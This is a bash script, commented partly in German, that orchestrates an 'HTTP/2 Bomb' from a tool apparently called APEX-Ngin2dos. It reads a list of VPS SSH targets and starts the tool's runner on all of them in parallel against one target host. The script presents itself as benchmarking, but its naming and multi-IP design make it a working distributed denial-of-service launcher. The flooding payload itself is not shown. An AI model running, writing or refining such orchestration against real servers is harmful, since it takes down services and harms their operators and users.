#!/usr/bin/env bash
# Multi-VPS HTTP/2 Bomb Orchestrator
# Startet benchmark_runner.py auf mehreren Hosts per SSH (je eigene Public-IP).
#
# hosts.txt Format (eine Zeile pro VPS):
#   user@203.0.113.10
#   user@203.0.113.11
#
# Voraussetzung: APEX-Ngin2dos auf jedem VPS unter REMOTE_DIR installiert.

set -euo pipefail

TARGET="${1:?Usage: $0 TARGET_HOST [CONNECTIONS] [MODE] [hosts.txt]}"
CONNECTIONS="${2:-20}"
MODE="${3:-multiprocess}"
HOSTS_FILE="${4:-$(dirname "$0")/hosts.txt.example}"
REMOTE_DIR="${REMOTE_DIR:-\$HOME/APEX-Ngin2dos}"
LOG_DIR="$(dirname "$0")/logs/multi_vps_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$LOG_DIR"

if [[ ! -f "$HOSTS_FILE" ]]; then
  echo "hosts file missing: $HOSTS_FILE"
  echo "Copy hosts.txt.example and add your VPS SSH targets."
  exit 1
fi

echo "=== Multi-VPS Orchestrator ==="
echo "Target:     $TARGET"
echo "Connections per VPS: $CONNECTIONS"
echo "Mode:       $MODE"
echo "Log dir:    $LOG_DIR"
echo ""

pids=()
while IFS= read -r line || [[ -n "$line" ]]; do
  line="${line%%#*}"
  line="$(echo "$line" | xargs)"
  [[ -z "$line" ]] && continue

  host_slug="${line//@/_}"
  log="$LOG_DIR/${host_slug}.log"
  echo "Launching on $line -> $log"

  ssh -o BatchMode=yes -o ConnectTimeout=15 "$line" bash -s <<EOF &
set -euo pipefail
cd ${REMOTE_DIR}
.venv/bin/python3 benchmark/benchmark_runner.py \\
  --host ${TARGET} --mode ${MODE} --connections ${CONNECTIONS}
EOF
  pids+=($!)
done < "$HOSTS_FILE"

echo ""
echo "Waiting for ${#pids[@]} remote jobs..."
fail=0
for pid in "${pids[@]}"; do
  wait "$pid" || fail=$((fail + 1))
done

echo ""
echo "Done. Failed: $fail / ${#pids[@]}"
echo "Collect logs from each VPS benchmark/logs/benchmark_results.csv manually or via scp."
